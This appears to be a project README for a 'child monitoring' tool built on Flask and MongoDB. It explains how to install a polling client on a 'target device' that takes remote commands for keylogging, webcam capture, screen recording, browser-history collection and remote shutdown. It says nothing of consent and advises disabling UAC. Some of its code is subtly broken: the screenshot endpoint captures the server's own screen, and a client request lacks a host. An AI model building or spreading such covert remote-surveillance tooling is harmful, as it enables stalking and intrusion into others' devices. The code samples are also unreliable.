# Child Monitoring System - Website & MongoDB Version

## Overview
This system has been converted from a **Telegram chatbot** to a **web-based dashboard** with **MongoDB database**. Now you can:
- Control child's device from a **website dashboard**
- Store all data in **MongoDB** (no more Telegram API)
- View screenshots, keystrokes, and browsing history
- Execute commands remotely

---

## Architecture

```
PARENT COMPUTER                    INTERNET                    CHILD COMPUTER
┌──────────────────┐              ┌──────────┐               ┌──────────────────┐
│  Web Browser     │ ←─────HTTP──→│  Server  │ ←─────HTTP──→│  Client Script   │
│  Dashboard       │              │ (Flask)  │              │ (Python)         │
│  (Port 5000)     │              │          │              │                  │
└──────────────────┘              └────┬─────┘              └──────────────────┘
                                       │
                                       ↓
                                  ┌──────────────────┐
                                  │   MongoDB        │
                                  │   Database       │
                                  │                  │
                                  │ - devices        │
                                  │ - commands       │
                                  │ - results        │
                                  │ - screenshots    │
                                  │ - keystrokes     │
                                  └──────────────────┘
```

---

## Installation & Setup

### Step 1: Install MongoDB
**Windows:**
1. Download from: https://www.mongodb.com/try/download/community
2. Install with default settings
3. MongoDB will run on `localhost:27017`

Or use **MongoDB Atlas** (Cloud):
- Create account at https://www.mongodb.com/cloud/atlas
- Create free cluster
- Get connection string: `mongodb+srv://username:password@cluster.mongodb.net/?retryWrites=true`

### Step 2: Install Python Dependencies

```bash
cd c:\Users\ronit\Desktop\techshurujan_2026
pip install -r requirements.txt
```

If you get errors, try individual installs:
```bash
pip install flask pymongo requests psutil pyautogui opencv-python mss numpy imageio imageio-ffmpeg pynput pillow
```

### Step 3: Configure the Backend

Edit `backend.py` - Line 17:
```python
MONGO_URI = "mongodb://localhost:27017/"  # Local MongoDB
# OR use MongoDB Atlas:
# MONGO_URI = "mongodb+srv://username:password@cluster.mongodb.net/?retryWrites=true"
```

### Step 4: Configure the Client

Edit `client.py` - Line 9:
```python
BACKEND_URL = "http://localhost:5000"  # For local testing
# For remote control:
# BACKEND_URL = "http://YOUR_SERVER_IP:5000"
```

Also update MongoDB connection (Line 13):
```python
MONGO_URI = "mongodb://localhost:27017/"
```

---

## How to Run

### Terminal 1: Start MongoDB (if local)
```bash
mongod
```

### Terminal 2: Start Flask Server
```bash
cd c:\Users\ronit\Desktop\techshurujan_2026
python backend.py
```
✅ Server runs on: **http://localhost:5000**

### Terminal 3: Start Client (on child's computer)
```bash
cd c:\path\to\techshurujan_2026
python client.py
```

### Terminal 4: Open Dashboard
```
Open browser → http://localhost:5000
```

---

## How Website Controls Files/System

### 1. **Command Flow:**
```
Click Button on Website
         ↓
Flask receives HTTP request
         ↓
Command stored in MongoDB with status="pending"
         ↓
Client polls MongoDB every 5 seconds
         ↓
Client finds pending command
         ↓
Client executes command (lock, screenshot, etc)
         ↓
Result stored in MongoDB
         ↓
Website displays result to parent
```

### 2. **Example: Take Screenshot**

**Website (JavaScript):**
```javascript
fetch('/api/command/screenshot', {
    method: 'POST',
    body: JSON.stringify({ device_id: 'CHILD-PC-NAME' })
})
```

**Flask Backend (Python):**
```python
@app.route('/api/command/screenshot', methods=['POST'])
def cmd_screenshot():
    screenshot = pyautogui.screenshot()
    # Convert to base64
    img_base64 = convert_to_base64(screenshot)
    # Store in MongoDB
    screenshots_col.insert_one({
        "device_id": device_id,
        "image_base64": img_base64,
        "created_at": datetime.now()
    })
    return {"image": img_base64}
```

**Client (Python):**
```python
def check_pending_commands():
    # Get commands from backend
    response = requests.get(f"/api/commands/pending/{device_id}")
    commands = response.json()
    
    for cmd in commands:
        if cmd['command'] == 'screenshot':
            # Backend already takes screenshot
            # Just mark as executed
            mark_command_executed(cmd['_id'])
```

### 3. **What Gets Stored in MongoDB:**

```javascript
// devices collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "device_name": "John's Laptop",
  "status": "online",
  "pc_info": {
    "system": "Windows 10",
    "cpu_usage": 15.2,
    "ram_used": 4096,
    "ip_address": "192.168.1.100"
  }
}

// commands collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "command": "screenshot",
  "status": "pending",
  "created_at": ISODate(...),
  "executed": false
}

// results collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "command_id": ObjectId(...),
  "result": "Screenshot captured",
  "success": true,
  "created_at": ISODate(...)
}

// screenshots collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "image_base64": "iVBORw0KGgoAAAANS...",
  "created_at": ISODate(...)
}

// keystrokes collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "text": "hello world",
  "created_at": ISODate(...)
}
```

---

## Available Commands

### System Info
- **PC Info** - Get CPU, RAM, Disk, IP address
- **Screenshot** - Capture screen
- **Webcam** - Capture from webcam
- **Record Screen** - Video record (specify duration)
- **Chrome History** - Get last 20 visited websites

### Control Commands
- **Lock PC** - Lock the screen
- **Logout** - Log out current user
- **Restart** - Restart computer
- **Shutdown** - Turn off computer

### Monitoring
- **Start Keylogger** - Log all keystrokes
- **Stop Keylogger** - Stop logging

---

## For Remote Control (Important)

### If you want to control from another computer:

**On Server (Your Computer):**
1. Find your IP address:
   ```bash
   ipconfig
   ```
   Look for "IPv4 Address" (e.g., 192.168.1.5)

2. Edit `backend.py`:
   ```python
   if __name__ == '__main__':
       app.run(debug=True, host='0.0.0.0', port=5000)  # Allow all IPs
   ```

3. Edit `client.py`:
   ```python
   BACKEND_URL = "http://192.168.1.5:5000"  # Your IP
   ```

4. Install client script on child's computer
5. Open browser on your computer: `http://192.168.1.5:5000`

---

## Database Queries (for MongoDB)

```javascript
// View all devices
db.devices.find()

// View pending commands
db.commands.find({ "executed": false })

// View recent screenshots
db.screenshots.find().sort({ "created_at": -1 }).limit(5)

// View keystroke logs for a device
db.keystrokes.find({ "device_id": "DESKTOP-ABC123" })

// View command results
db.results.find({ "device_id": "DESKTOP-ABC123" }).sort({ "created_at": -1 })

// Delete old data (older than 7 days)
db.screenshots.deleteMany({ "created_at": { $lt: new Date(Date.now() - 7*24*60*60*1000) } })
```

---

## Troubleshooting

### 1. **Client shows "Connection refused"**
- Make sure Flask server is running
- Check if `BACKEND_URL` is correct
- Check firewall settings

### 2. **MongoDB connection error**
- Make sure MongoDB is running: `mongod`
- Or use MongoDB Atlas cloud version
- Check `MONGO_URI` in both files

### 3. **Website not loading**
- Flask should be on http://localhost:5000
- Check if port 5000 is not used by another app
- Try different port: `app.run(port=5001)`

### 4. **Screenshots/Keystrokes not appearing**
- Client might not be running
- Check client terminal for errors
- Make sure device is registered

### 5. **Permission denied errors**
- Run Python as Administrator
- Or disable UAC (User Account Control)

---

## Security Tips

⚠️ **WARNING: This is a powerful monitoring tool!**

1. **Secure MongoDB** - Add authentication if accessible remotely
2. **Use HTTPS** - For production, use SSL certificates
3. **Change Flask Secret Key** - Add: `app.config['SECRET_KEY'] = 'your-secret-key'`
4. **Firewall** - Block port 5000 from public internet
5. **Encryption** - Add password protection to dashboard

Example with authentication:
```python
from flask import session, request
from functools import wraps

@app.before_request
def check_auth():
    if request.path == '/login':
        return
    if 'user_id' not in session:
        return redirect('/login')
```

---

## Convert Back to Telegram (Optional)

If you want to keep both systems working, you can:
```python
# Send result to Telegram AND store in MongoDB
import requests

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
payload = {"chat_id": CHAT_ID, "text": result}
requests.post(url, data=payload)

# Also store in MongoDB
results_col.insert_one(result_doc)
```

---

## File Structure

```
techshurujan_2026/
├── backend.py              # Flask server
├── client.py               # Client script (install on child PC)
├── templates/
│   └── index.html          # Web dashboard
├── requirements.txt        # Python packages
└── README.md              # This file
```

---

## Next Steps

1. ✅ Install MongoDB
2. ✅ Install Python packages
3. ✅ Run backend server
4. ✅ Run client on target device
5. ✅ Open website dashboard
6. ✅ Click device to start monitoring

---

## Support & Customization

To add more commands:

1. **Add endpoint in `backend.py`:**
```python
@app.route('/api/command/newcommand', methods=['POST'])
def cmd_newcommand():
    # Your code here
    return jsonify({"status": "success"})
```

2. **Add button in `index.html`:**
```html
<button class="btn-primary" onclick="executeCommand('newcommand')">New Command</button>
```

3. **Add execution in `client.py`:**
```python
elif command_type == "newcommand":
    # Execute your command
    pass
```

---

**Created: 2026-02-01**  
**System: Child Monitoring with Web Dashboard & MongoDB**
"# ParentEye" 
